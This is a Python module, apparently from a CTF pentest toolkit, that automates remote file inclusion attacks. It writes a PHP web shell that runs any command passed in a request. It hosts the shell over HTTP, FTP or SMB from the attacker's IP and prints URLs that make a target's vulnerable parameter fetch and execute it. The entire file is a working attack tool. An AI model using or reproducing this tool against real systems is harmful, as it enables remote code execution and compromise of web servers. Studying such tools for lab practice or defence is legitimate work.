
import subprocess
from pathlib import Path
from core.attacker import resolve_lhost
from core.target import get_current_url

PROVIDES=[]; REQUIRES=[]

G='\033[92m'; C='\033[96m'; B='\033[94m'; Y='\033[93m'; R='\033[91m'; W='\033[0m'; BOLD='\033[1m'
SHELL='<?php system($_GET["cmd"]); ?>'

def start(cmd,cwd):
    subprocess.Popen(["x-terminal-emulator","-e",f"bash -c 'cd {cwd}; {' '.join(cmd)}; exec bash'"])

def menu():
    print(f"\n{B}┌── {BOLD}LFI RFI{W}{B} ────────────────┐{W}")
    print(f"{B}└─────────────────────────────────┘{W}\n")
    print("  [1] HTTP\n  [2] FTP\n  [3] SMB\n  [4] Show All\n")
    return input(f"{Y}Select> {W}").strip() or "1"

def run(data,cred,args):
    base=get_current_url(data)
    if not base:
        print(f"\\n{R}[!] No target selected.{W}\\n"); return

    url=input(f"{Y}Base URL [{base}]> {W}").strip() or base
    param=input(f"{Y}LFI Parameter [language]> {W}").strip() or "language"
    cmd=input(f"{Y}Command [id]> {W}").strip() or "id"
    ip=resolve_lhost()
    ip=input(f"{Y}Listener IP [{ip}]> {W}").strip() or ip
    port=input(f"{Y}HTTP Port [8080]> {W}").strip() or "8080"

    choice=menu()

    outdir=Path("/tmp/ctfkit_rfi")
    outdir.mkdir(parents=True,exist_ok=True)
    (outdir/"shell.php").write_text(SHELL)

    def http():
        start(["python3","-m","http.server",port],outdir)
        print(f"\n{G}[+] HTTP Payload{W}\n")
        print(f"{C}{url}?{param}=http://{ip}:{port}/shell.php&cmd={cmd}{W}\n")

    def ftp():
        start(["python3","-m","pyftpdlib","-p","21"],outdir)
        print(f"\n{G}[+] FTP Payload{W}\n")
        print(f"{C}{url}?{param}=ftp://{ip}/shell.php&cmd={cmd}{W}\n")

    def smb():
        start(["impacket-smbserver","-smb2support","share","."],outdir)
        print(f"\n{G}[+] SMB Payload{W}\n")
        print(f"{C}{url}?{param}=\\\\{ip}\\share\\shell.php&cmd={cmd}{W}\n")

    if choice=="1": http()
    elif choice=="2": ftp()
    elif choice=="3": smb()
    else:
        http(); ftp(); smb()
